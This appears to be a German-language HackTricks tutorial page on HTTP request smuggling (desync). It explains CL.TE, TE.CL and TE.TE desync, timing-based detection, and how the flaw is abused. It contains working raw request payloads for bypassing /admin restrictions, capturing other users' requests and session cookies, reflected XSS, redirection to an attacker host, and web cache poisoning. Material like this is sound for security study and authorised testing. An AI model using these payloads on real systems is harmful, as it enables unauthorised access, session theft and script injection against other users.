# HTTP Request Smuggling / HTTP Desync Angriff

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks in PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>

## Was ist

Diese Schwachstelle tritt auf, wenn eine **Desynchronisation** zwischen **Front-End-Proxies** und dem **Back-End-Server** einem **Angreifer** erm√∂glicht, eine HTTP-Anfrage zu **senden**, die von den **Front-End-Proxies** (Lastenausgleichs-/Reverse-Proxy) als **eine Anfrage** und vom **Back-End-Server** als **2 Anfragen** interpretiert wird.\
Dies erm√∂glicht es einem Benutzer, die **n√§chste Anfrage zu modifizieren, die nach ihm beim Back-End-Server ankommt**.

### Theorie

[**RFC-Spezifikation (2161)**](https://tools.ietf.org/html/rfc2616)

> Wenn eine Nachricht sowohl ein Transfer-Encoding-Headerfeld als auch ein Content-Length-Headerfeld enth√§lt, muss letzteres ignoriert werden.

**Content-Length**

> Der Content-Length-Entit√§tsheader gibt die Gr√∂√üe des Entit√§tsk√∂rpers in Bytes an, der an den Empf√§nger gesendet wird.

**Transfer-Encoding: chunked**

> Der Transfer-Encoding-Header gibt die Art der Codierung an, die verwendet wird, um den Nutzlastk√∂rper sicher an den Benutzer zu √ºbertragen.\
> Chunked bedeutet, dass gro√üe Daten in einer Reihe von Chunks gesendet werden.

### Realit√§t

Das **Front-End** (ein Lastenausgleich / Reverse-Proxy) **verarbeitet** den _**Content-Length**_- oder den _**Transfer-Encoding**_-Header und der **Back-End-Server verarbeitet den anderen**, was eine **Desynchronisation** zwischen den beiden Systemen verursacht.\
Dies k√∂nnte sehr kritisch sein, da **ein Angreifer eine Anfrage an den Reverse-Proxy senden kann**, die vom **Back-End-Server als 2 verschiedene Anfragen interpretiert wird**. Die **Gefahr** dieser Technik besteht darin, dass der **Back-End-Server die 2. injizierte Anfrage interpretieren wird**, als ob sie **vom n√§chsten Client stammt**, und die **echte Anfrage** dieses Clients wird **Teil** der **injizierten Anfrage** sein.

### Besonderheiten

Denken Sie daran, dass in HTTP **ein Zeilenumbruch aus 2 Bytes besteht**:

* **Content-Length**: Dieser Header verwendet eine **Dezimalzahl**, um die **Anzahl** von **Bytes** des **K√∂rpers** der Anfrage anzugeben. Der K√∂rper soll mit dem letzten Zeichen enden, **ein Zeilenumbruch ist am Ende der Anfrage nicht erforderlich**.
* **Transfer-Encoding:** Dieser Header verwendet im **K√∂rper** eine **hexadezimale Zahl**, um die **Anzahl** von **Bytes** des **n√§chsten Chunks** anzugeben. Der **Chunk** muss mit einem **Zeilenumbruch enden**, aber dieser Zeilenumbruch **wird nicht durch den L√§ngenindikator gez√§hlt**. Diese √úbertragungsmethode muss mit einem **Chunk der Gr√∂√üe 0 enden, gefolgt von 2 Zeilenumbr√ºchen**: `0`
* **Connection**: Basierend auf meiner Erfahrung wird empfohlen, **`Connection: keep-alive`** bei der ersten Anfrage des Request Smuggling zu verwenden.

## Grundlegende Beispiele

{% hint style="success" %}
Beim Versuch, dies mit Burp Suite auszunutzen, **deaktivieren Sie `Update Content-Length` und `Normalize HTTP/1 line endings`** im Repeater, da einige Gadgets Zeilenumbr√ºche, Wagenr√ºckl√§ufe und fehlerhafte Content-Lengths missbrauchen.
{% endhint %}

HTTP-Angriffe durch Anfrageschmuggelung werden durch das Senden mehrdeutiger Anfragen erstellt, die Diskrepanzen in der Interpretation der `Content-Length` (CL) und `Transfer-Encoding` (TE) Header durch Front-End- und Back-End-Server ausnutzen. Diese Angriffe k√∂nnen sich in verschiedenen Formen manifestieren, haupts√§chlich als **CL.TE**, **TE.CL** und **TE.TE**. Jeder Typ repr√§sentiert eine einzigartige Kombination, wie die Front-End- und Back-End-Server diese Header priorisieren. Die Schwachstellen entstehen daraus, dass die Server dieselbe Anfrage auf unterschiedliche Weise verarbeiten, was zu unerwarteten und potenziell b√∂sartigen Ergebnissen f√ºhren kann.

### Grundlegende Beispiele von Schwachstellentypen

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

#### CL.TE Schwachstelle (Content-Length vom Front-End verwendet, Transfer-Encoding vom Back-End verwendet)

* **Front-End (CL):** Verarbeitet die Anfrage basierend auf dem `Content-Length`-Header.
* **Back-End (TE):** Verarbeitet die Anfrage basierend auf dem `Transfer-Encoding`-Header.
* **Angriffsszenario:**
* Der Angreifer sendet eine Anfrage, bei der der Wert des `Content-Length`-Headers nicht mit der tats√§chlichen Inhaltsl√§nge √ºbereinstimmt.
* Der Front-End-Server leitet die gesamte Anfrage an das Back-End weiter, basierend auf dem Wert von `Content-Length`.
* Der Back-End-Server verarbeitet die Anfrage aufgrund des `Transfer-Encoding: chunked`-Headers als gest√ºckelt und interpretiert die verbleibenden Daten als separate, nachfolgende Anfrage.
*   **Beispiel:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### TE.CL Schwachstelle (Transfer-Encoding vom Front-End verwendet, Content-Length vom Back-End verwendet)

* **Front-End (TE):** Verarbeitet die Anfrage basierend auf dem `Transfer-Encoding`-Header.
* **Back-End (CL):** Verarbeitet die Anfrage basierend auf dem `Content-Length`-Header.
* **Angriffsszenario:**
* Der Angreifer sendet eine gest√ºckelte Anfrage, bei der die Chunk-Gr√∂√üe (`7b`) und die tats√§chliche Inhaltsl√§nge (`Content-Length: 4`) nicht √ºbereinstimmen.
* Der Front-End-Server leitet die gesamte Anfrage an das Back-End weiter, indem er `Transfer-Encoding` beachtet.
* Der Back-End-Server verarbeitet aufgrund von `Content-Length` nur den Anfang der Anfrage (`7b` Bytes) und l√§sst den Rest als Teil einer unbeabsichtigten nachfolgenden Anfrage.
*   **Beispiel:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```
#### TE.TE Schwachstelle (Transfer-Encoding von beiden verwendet, mit Verschleierung)

* **Server:** Beide unterst√ºtzen `Transfer-Encoding`, aber einer kann durch Verschleierung dazu gebracht werden, es zu ignorieren.
* **Angriffsszenario:**
* Der Angreifer sendet eine Anfrage mit verschleierten `Transfer-Encoding`-Headern.
* Je nachdem, welcher Server (Front-End oder Back-End) die Verschleierung nicht erkennt, kann eine CL.TE- oder TE.CL-Schwachstelle ausgenutzt werden.
* Der nicht verarbeitete Teil der Anfrage, wie von einem der Server gesehen, wird Teil einer nachfolgenden Anfrage, was zu smuggling f√ºhrt.
*   **Beispiel:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **CL.CL Szenario (Content-Length von Front-End und Back-End verwendet):**

* Beide Server verarbeiten die Anfrage ausschlie√ülich anhand des `Content-Length`-Headers.
* Dieses Szenario f√ºhrt in der Regel nicht zu smuggling, da beide Server die Anfragel√§nge auf die gleiche Weise interpretieren.
*   **Beispiel:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Normale Anfrage
```

#### **CL != 0 Szenario:**

* Bezieht sich auf Szenarien, in denen der `Content-Length`-Header vorhanden ist und einen Wert ungleich Null hat, was darauf hinweist, dass der Anfragek√∂rper Inhalt hat.
* Es ist entscheidend f√ºr das Verst√§ndnis und die Ausf√ºhrung von smuggling-Angriffen, da es beeinflusst, wie Server das Ende einer Anfrage bestimmen.
*   **Beispiel:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Nicht-leerer K√∂rper
```

#### Das Brechen des Webservers

Diese Technik ist auch n√ºtzlich in Szenarien, in denen es m√∂glich ist, **einen Webserver zu st√∂ren, w√§hrend die anf√§nglichen HTTP-Daten gelesen werden**, aber **ohne die Verbindung zu schlie√üen**. Auf diese Weise wird der **K√∂rper** der HTTP-Anfrage als **n√§chste HTTP-Anfrage** betrachtet.

Zum Beispiel, wie in [**diesem Bericht**](https://mizu.re/post/twisty-python) erkl√§rt, war es in Werkzeug m√∂glich, einige **Unicode**-Zeichen zu senden und den Server zum **Absturz zu bringen**. Wenn jedoch die HTTP-Verbindung mit dem Header **`Connection: keep-alive`** erstellt wurde, wird der K√∂rper der Anfrage nicht gelesen und die Verbindung bleibt offen, sodass der **K√∂rper** der Anfrage als **n√§chste HTTP-Anfrage** behandelt wird.

#### Erzwingen √ºber hop-by-hop-Header

Durch den Missbrauch von hop-by-hop-Headern k√∂nnten Sie dem Proxy anzeigen, den Header **Content-Length oder Transfer-Encoding zu l√∂schen, sodass ein HTTP-Anfrage-Smuggling m√∂glich ist, um Missbrauch zu betreiben**.
```
Connection: Content-Length
```
## Auffinden von HTTP-Request-Smuggling

Die Identifizierung von HTTP-Request-Smuggling-Schwachstellen kann oft mithilfe von Timing-Techniken erreicht werden, die darauf beruhen, wie lange der Server ben√∂tigt, um auf manipulierte Anfragen zu antworten. Diese Techniken sind besonders n√ºtzlich zur Erkennung von CL.TE- und TE.CL-Schwachstellen. Neben diesen Methoden gibt es auch andere Strategien und Tools, die verwendet werden k√∂nnen, um solche Schwachstellen zu finden:

### Auffinden von CL.TE-Schwachstellen mithilfe von Timing-Techniken

* **Methode:**
* Senden Sie eine Anfrage, die, wenn die Anwendung anf√§llig ist, dazu f√ºhrt, dass der Backend-Server auf zus√§tzliche Daten wartet.
*   **Beispiel:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
* **Beobachtung:**
* Der Front-End-Server verarbeitet die Anfrage basierend auf `Content-Length` und unterbricht die Nachricht vorzeitig.
* Der Backend-Server, der eine chunked-Nachricht erwartet, wartet auf den n√§chsten Chunk, der nie ankommt, was zu einer Verz√∂gerung f√ºhrt.
* **Indikatoren:**
* Timeouts oder lange Verz√∂gerungen bei der Antwort.
* Erhalt eines 400 Bad Request-Fehlers vom Backend-Server, manchmal mit detaillierten Serverinformationen.

### Auffinden von TE.CL-Schwachstellen mithilfe von Timing-Techniken

* **Methode:**
* Senden Sie eine Anfrage, die, wenn die Anwendung anf√§llig ist, dazu f√ºhrt, dass der Backend-Server auf zus√§tzliche Daten wartet.
*   **Beispiel:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
* **Beobachtung:**
* Der Front-End-Server verarbeitet die Anfrage basierend auf `Transfer-Encoding` und leitet die gesamte Nachricht weiter.
* Der Backend-Server, der eine Nachricht basierend auf `Content-Length` erwartet, wartet auf zus√§tzliche Daten, die nie eintreffen, was zu einer Verz√∂gerung f√ºhrt.

### Andere Methoden zum Auffinden von Schwachstellen

* **Differentielle Antwortanalyse:**
* Senden Sie leicht abgewandelte Versionen einer Anfrage und beobachten Sie, ob sich die Serverantworten auf unerwartete Weise unterscheiden, was auf eine Analyse-Diskrepanz hinweist.
* **Verwendung automatisierter Tools:**
* Tools wie die 'HTTP Request Smuggler'-Erweiterung von Burp Suite k√∂nnen automatisch auf diese Schwachstellen testen, indem sie verschiedene Formen von mehrdeutigen Anfragen senden und die Antworten analysieren.
* **Tests zur Content-Length-Varianz:**
* Senden Sie Anfragen mit unterschiedlichen `Content-Length`-Werten, die nicht mit der tats√§chlichen Inhaltsl√§nge √ºbereinstimmen, und beobachten Sie, wie der Server mit solchen Abweichungen umgeht.
* **Tests zur Transfer-Encoding-Varianz:**
* Senden Sie Anfragen mit verschleierten oder fehlerhaften `Transfer-Encoding`-Headern und √ºberwachen Sie, wie unterschiedlich der Front-End- und der Back-End-Server auf solche Manipulationen reagieren.

### Testen von HTTP-Request-Smuggling-Schwachstellen

Nach Best√§tigung der Wirksamkeit von Timing-Techniken ist es entscheidend zu √ºberpr√ºfen, ob Client-Anfragen manipuliert werden k√∂nnen. Eine einfache Methode besteht darin, Ihre Anfragen zu manipulieren, z. B. eine Anfrage an `/` zu senden, die eine 404-Antwort ausl√∂st. Die zuvor diskutierten `CL.TE`- und `TE.CL`-Beispiele in [Grundlegende Beispiele](./#basic-examples) zeigen, wie man eine Client-Anfrage manipuliert, um eine 404-Antwort hervorzurufen, obwohl der Client versucht, auf eine andere Ressource zuzugreifen.

**Wichtige √úberlegungen**

Beim Testen von Request-Smuggling-Schwachstellen durch Eingriffe in andere Anfragen beachten Sie:

* **Unterschiedliche Netzwerkverbindungen:** Die "Angriffs-" und "normalen" Anfragen sollten √ºber separate Netzwerkverbindungen gesendet werden. Die Verwendung derselben Verbindung f√ºr beide best√§tigt nicht das Vorhandensein der Schwachstelle.
* **Konsistente URL und Parameter:** Versuchen Sie, f√ºr beide Anfragen identische URLs und Parameter zu verwenden. Moderne Anwendungen leiten Anfragen oft an spezifische Backend-Server basierend auf URL und Parametern weiter. Durch die √úbereinstimmung wird die Wahrscheinlichkeit erh√∂ht, dass beide Anfragen vom selben Server verarbeitet werden, eine Voraussetzung f√ºr einen erfolgreichen Angriff.
* **Timing und Rennbedingungen:** Die "normale" Anfrage, die dazu dient, St√∂rungen von der "Angriffs-" Anfrage zu erkennen, konkurriert mit anderen gleichzeitigen Anwendungsanfragen. Senden Sie daher die "normale" Anfrage unmittelbar nach der "Angriffs-" Anfrage. Bei stark frequentierten Anwendungen sind m√∂glicherweise mehrere Versuche zur endg√ºltigen Best√§tigung der Schwachstelle erforderlich.
* **Herausforderungen beim Lastenausgleich:** Front-End-Server, die als Lastenausgleicher fungieren, k√∂nnen Anfragen auf verschiedene Backend-Systeme verteilen. Wenn die "Angriffs-" und "normalen" Anfragen auf verschiedenen Systemen landen, wird der Angriff nicht erfolgreich sein. Dieser Aspekt des Lastenausgleichs erfordert m√∂glicherweise mehrere Versuche, um eine Schwachstelle zu best√§tigen.
* **Unbeabsichtigte Benutzerbeeintr√§chtigung:** Wenn Ihr Angriff unbeabsichtigt die Anfrage eines anderen Benutzers beeinflusst (nicht die "normale" Anfrage, die Sie zur Erkennung gesendet haben), deutet dies darauf hin, dass Ihr Angriff einen anderen Anwendungsbenutzer beeinflusst hat. Kontinuierliche Tests k√∂nnten andere Benutzer st√∂ren, was einen vorsichtigen Ansatz erfordert.

## Missbrauch von HTTP-Request-Smuggling

### Umgehung der Front-End-Sicherheit √ºber HTTP-Request-Smuggling

Manchmal setzen Front-End-Proxys Sicherheitsma√ünahmen durch Pr√ºfung eingehender Anfragen um. Diese Ma√ünahmen k√∂nnen jedoch durch Ausnutzen von HTTP-Request-Smuggling umgangen werden, was unbefugten Zugriff auf eingeschr√§nkte Endpunkte erm√∂glicht. Beispielsweise k√∂nnte der Zugriff auf `/admin` extern untersagt sein, wobei der Front-End-Proxy solche Versuche aktiv blockiert. Dennoch k√∂nnte dieser Proxy es vers√§umen, eingebettete Anfragen innerhalb einer geschmuggelten HTTP-Anfrage zu √ºberpr√ºfen, was eine Schlupfloch f√ºr das Umgehen dieser Einschr√§nkungen darstellt.

Betrachten Sie die folgenden Beispiele, die veranschaulichen, wie HTTP-Request-Smuggling verwendet werden kann, um Front-End-Sicherheitskontrollen zu umgehen und speziell den `/admin`-Pfad anzugreifen, der normalerweise vom Front-End-Proxy gesch√ºtzt wird:

**CL.TE Beispiel**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
Im CL.TE-Angriff wird der `Content-Length`-Header f√ºr die erste Anfrage genutzt, w√§hrend die nachfolgende eingebettete Anfrage den `Transfer-Encoding: chunked`-Header verwendet. Der Front-End-Proxy verarbeitet die anf√§ngliche `POST`-Anfrage, √ºberpr√ºft jedoch nicht die eingebettete `GET /admin`-Anfrage, was unbefugten Zugriff auf den Pfad `/admin` erm√∂glicht.

**TE.CL Beispiel**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
Im TE.CL-Angriff verwendet die anf√§ngliche `POST`-Anfrage `Transfer-Encoding: chunked`, und die nachfolgende eingebettete Anfrage wird auf der Grundlage des `Content-Length`-Headers verarbeitet. √Ñhnlich wie beim CL.TE-Angriff √ºbersieht der Front-End-Proxy die eingeschleuste `GET /admin`-Anfrage und gew√§hrt unbeabsichtigt Zugriff auf den eingeschr√§nkten Pfad `/admin`.

### Offenlegung der Umleitung von Front-End-Anfragen <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Anwendungen verwenden oft einen **Front-End-Server**, um eingehende Anfragen vor der Weiterleitung an den Back-End-Server zu modifizieren. Eine typische Modifikation besteht darin, Header wie `X-Forwarded-For: <IP des Clients>` hinzuzuf√ºgen, um die IP des Clients an den Back-End weiterzuleiten. Das Verst√§ndnis dieser Modifikationen kann entscheidend sein, da es m√∂glicherweise Wege aufzeigt, um **Schutzmechanismen zu umgehen** oder **verborgene Informationen oder Endpunkte aufzudecken**.

Um zu untersuchen, wie ein Proxy eine Anfrage √§ndert, suchen Sie nach einem POST-Parameter, den das Back-End in der Antwort wiedergibt. Erstellen Sie dann eine Anfrage, wobei dieser Parameter zuletzt verwendet wird, √§hnlich wie folgt:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
In dieser Struktur werden nach `search=` die nachfolgenden Anforderungskomponenten angeh√§ngt, die im Antwortteil reflektiert werden. Diese Reflexion wird die Header der nachfolgenden Anfrage offenlegen.

Es ist wichtig, den `Content-Length`-Header der verschachtelten Anfrage mit der tats√§chlichen Inhaltsl√§nge abzustimmen. Es ist ratsam, mit einem kleinen Wert zu beginnen und allm√§hlich zu erh√∂hen, da ein zu niedriger Wert die reflektierten Daten abschneiden wird, w√§hrend ein zu hoher Wert dazu f√ºhren kann, dass die Anfrage fehlschl√§gt.

Diese Technik ist auch im Zusammenhang mit einer TE.CL-Schwachstelle anwendbar, aber die Anfrage sollte mit `search=\r\n0` enden. Unabh√§ngig von den Zeilenumbr√ºchen werden die Werte an den Suchparameter angeh√§ngt.

Dieses Verfahren dient haupts√§chlich dazu, die Anpassungen der Anfrage zu verstehen, die vom Front-End-Proxy vorgenommen wurden, und f√ºhrt im Wesentlichen eine selbstgerichtete Untersuchung durch.

### Erfassen von Anfragen anderer Benutzer <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

Es ist m√∂glich, die Anfragen des n√§chsten Benutzers zu erfassen, indem man eine spezifische Anfrage als Wert eines Parameters w√§hrend einer POST-Operation anh√§ngt. So kann dies erreicht werden:

Durch Anh√§ngen der folgenden Anfrage als Wert eines Parameters k√∂nnen Sie die nachfolgende Anfrage des Clients speichern:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
In diesem Szenario ist der **Kommentarparameter** dazu gedacht, die Inhalte innerhalb des Kommentarbereichs eines √∂ffentlich zug√§nglichen Beitrags zu speichern. Folglich werden die Inhalte des nachfolgenden Requests als Kommentar erscheinen.

Diese Technik hat jedoch Einschr√§nkungen. Im Allgemeinen erfasst sie nur Daten bis zum Parameter-Trennzeichen, das im geschmuggelten Request verwendet wird. Bei URL-codierten Formular√ºbermittlungen ist dieses Trennzeichen das Zeichen `&`. Das bedeutet, dass der erfasste Inhalt aus der Anfrage des Opferbenutzers am ersten `&` endet, das m√∂glicherweise sogar Teil der Abfragezeichenfolge ist.

Dar√ºber hinaus ist zu beachten, dass dieser Ansatz auch bei einer TE.CL-Verwundbarkeit m√∂glich ist. In solchen F√§llen sollte die Anfrage mit `search=\r\n0` enden. Unabh√§ngig von Zeilenumbruchszeichen werden die Werte dem Suchparameter angeh√§ngt.

### Verwendung von HTTP-Request-Smuggling zur Ausnutzung von reflektiertem XSS

HTTP-Request-Smuggling kann genutzt werden, um Webseiten auszunutzen, die anf√§llig f√ºr **Reflektiertes XSS** sind, und bietet erhebliche Vorteile:

* Die Interaktion mit den Zielbenutzern ist **nicht erforderlich**.
* Erm√∂glicht die Ausnutzung von XSS in Teilen der Anfrage, die normalerweise **nicht erreichbar** sind, wie z. B. den HTTP-Request-Headern.

In Szenarien, in denen eine Website durch den User-Agent-Header anf√§llig f√ºr Reflektiertes XSS ist, zeigt das folgende Payload, wie diese Verwundbarkeit ausgenutzt werden kann:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
Dieses Payload ist strukturiert, um die Schwachstelle auszunutzen, indem:

1. Ein `POST`-Request initiiert wird, scheinbar typisch, mit einem `Transfer-Encoding: chunked`-Header, um den Beginn des Smugglings anzugeben.
2. Es folgt eine `0`, die das Ende des chunked Nachrichtenrumpfs markiert.
3. Dann wird ein geschmuggelter `GET`-Request eingef√ºhrt, bei dem der `User-Agent`-Header mit einem Skript, `<script>alert(1)</script>`, injiziert wird, das das XSS ausl√∂st, wenn der Server diesen nachfolgenden Request verarbeitet.

Durch die Manipulation des `User-Agent` durch Smuggling umgeht der Payload normale Request-Beschr√§nkungen und nutzt so die Reflected XSS-Schwachstelle auf unkonventionelle, aber effektive Weise aus.

#### HTTP/0.9

{% hint style="danger" %}
Falls der Benutzerinhalt in einer Antwort mit einem **`Content-Type`** wie **`text/plain`** reflektiert wird, was die Ausf√ºhrung des XSS verhindert. Wenn der Server **HTTP/0.9 unterst√ºtzt, k√∂nnte es m√∂glich sein, dies zu umgehen**!
{% endhint %}

Die Version HTTP/0.9 war vor der 1.0 und verwendet nur **GET**-Verben und antwortet **nicht** mit **Headern**, sondern nur mit dem Body.

In [**diesem Bericht**](https://mizu.re/post/twisty-python) wurde dies mit einem Request-Smuggling und einem **anf√§lligen Endpunkt, der mit der Eingabe des Benutzers antwortet**, missbraucht, um einen Request mit HTTP/0.9 zu schmuggeln. Der Parameter, der in der Antwort reflektiert wird, enthielt eine **gef√§lschte HTTP/1.1-Antwort (mit Headern und Body)**, sodass die Antwort g√ºltigen ausf√ºhrbaren JS-Code mit einem `Content-Type` von `text/html` enth√§lt.

### Ausnutzen von On-Site-Weiterleitungen mit HTTP-Request-Smuggling <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

Anwendungen leiten oft von einer URL zu einer anderen weiter, indem sie den Hostnamen aus dem `Host`-Header in der Weiterleitungs-URL verwenden. Dies ist bei Webservern wie Apache und IIS √ºblich. Wenn beispielsweise eine Anforderung an einen Ordner ohne abschlie√üenden Schr√§gstrich gestellt wird, erfolgt eine Weiterleitung, um den Schr√§gstrich einzuschlie√üen:
```
GET /home HTTP/1.1
Host: normal-website.com
```
Ergebnisse in:
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
Obwohl scheinbar harmlos, kann dieses Verhalten durch die Verwendung von HTTP-Request-Smuggling manipuliert werden, um Benutzer auf eine externe Website umzuleiten. Zum Beispiel:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
Diese geschmuggelte Anfrage k√∂nnte dazu f√ºhren, dass die n√§chste verarbeitete Benutzeranfrage auf eine von einem Angreifer kontrollierte Website umgeleitet wird:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
Ergebnisse in:
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
In diesem Szenario wird die Anfrage eines Benutzers nach einer JavaScript-Datei abgefangen. Der Angreifer kann potenziell den Benutzer gef√§hrden, indem er b√∂sartiges JavaScript als Antwort bereitstellt.

### Ausnutzen der Web-Cache-Vergiftung √ºber HTTP-Request-Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Die Web-Cache-Vergiftung kann durchgef√ºhrt werden, wenn ein beliebiger Bestandteil der **Front-End-Infrastruktur Inhalte zwischenspeichert**, in der Regel zur Leistungssteigerung. Durch Manipulation der Serverantwort ist es m√∂glich, **den Cache zu vergiften**.

Zuvor haben wir beobachtet, wie Serverantworten so ver√§ndert werden konnten, dass ein 404-Fehler zur√ºckgegeben wird (siehe [Grundlegende Beispiele](./#basic-examples)). Ebenso ist es m√∂glich, den Server dazu zu bringen, den Inhalt von `/index.html` als Antwort auf eine Anfrage nach `/static/include.js` zu liefern. Folglich wird der Inhalt von `/static/include.js` im Cache durch den von `/index.html` ersetzt, wodurch `/static/include.js` f√ºr Benutzer unzug√§nglich wird und m√∂glicherweise zu einem Denial-of-Service (DoS) f√ºhrt.

Diese Technik wird besonders wirksam, wenn eine **Open-Redirect-Schwachstelle** entdeckt wird oder wenn es eine **Weiterleitung vor Ort zu einem offenen Redirect** gibt. Solche Schwachstellen k√∂nnen ausgenutzt werden, um den zwischengespeicherten Inhalt von `/static/include.js` durch ein Skript unter der Kontrolle des Angreifers zu ersetzen, was im Wesentlichen einen weit verbreiteten Cross-Site-Scripting (XSS)-Angriff gegen alle Clients erm√∂glicht, die die aktualisierte `/static/include.js` anfordern.

Im Folgenden wird die Ausnutzung der **Cache-Vergiftung in Kombination mit einer Weiterleitung vor Ort zu einem offenen Redirect** veranschaulicht. Ziel ist es, den Cache-Inhalt von `/static/include.js` so zu √§ndern, dass JavaScript-Code, der von dem Angreifer kontrolliert wird, bereitgestellt wird:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
Beachten Sie die eingebettete Anfrage, die auf `/post/next?postId=3` abzielt. Diese Anfrage wird auf `/post?postId=4` umgeleitet, wobei der **Host-Header-Wert** verwendet wird, um die Domain zu bestimmen. Durch √Ñndern des **Host-Headers** kann der Angreifer die Anfrage auf ihre Domain umleiten (**On-Site-Weiterleitung zu Off-Site-Weiterleitung**).

Nach erfolgreichem **Socket-Poisoning** sollte eine **GET-Anfrage** f√ºr `/static/include.js` initiiert werden. Diese Anfrage wird durch die vorherige **On-Site-Weiterleitung zu Off-Site-Weiterleitung**-Anfrage kontaminiert und ruft den Inhalt des Skripts ab, der vom Angreifer kontrolliert wird.

Anschlie√üend wird jede Anfrage nach `/static/include.js` den zwischengespeicherten Inhalt des Skripts des Angreifers bedienen und so einen umfassenden XSS-Angriff starten.

### Verwendung von HTTP-Anfrageschmuggel, um Web-Cache-T√§uschung durchzuf√ºhren <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

